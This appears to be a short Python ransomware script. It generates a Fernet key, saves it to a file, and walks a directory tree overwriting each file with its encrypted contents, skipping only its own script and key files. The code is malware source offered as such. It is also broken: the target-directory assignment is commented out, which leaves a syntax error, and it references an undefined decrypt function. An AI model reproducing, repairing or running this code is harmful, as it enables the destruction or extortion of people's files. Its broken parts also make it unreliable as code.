from cryptography.fernet import Fernet
import os
from subprocess import Popen, PIPE

#CMD = Popen('set USERPROFILE', shell=True, stdout=PIPE, stderr=PIPE)
#result= CMD.stdout.read().decode('utf-8')

#null, userprof = result.split('=')

# Generate a key
# Define the function to encrypt a file
key = Fernet.generate_key()
cipher_suite = key
with open("thekey.key", "wb") as thekey:
        thekey.write(cipher_suite)

def encrypt_file(file_path, cipher_suite):
    with open(file_path, 'rb') as file:
        plaintext = file.read()
        ciphertext = Fernet(cipher_suite).encrypt(plaintext)
    with open(file_path, 'wb') as file:
        file.write(ciphertext)

# Encrypt files in a directory and its subdirectories
def encrypt_directory(directory_path, cipher_suite):
    for foldername, subfolders, filenames in os.walk(directory_path):
        for filename in filenames:
            if filename == 'Ransomware.py' or filename == 'Decrypt.py' or filename == 'thekey.key':
                continue
            else:
                file_path = os.path.join(foldername, filename)
                encrypt_file(file_path, cipher_suite)

# Example usage
directory_to_protect = #'/home/dimeji/Documents/Python_Script/Ransom/Temp'
encrypt_directory(directory_to_protect, cipher_suite)

# To decrypt the files, you can use:
#decrypt_directory(directory_to_protect, cipher_suite)
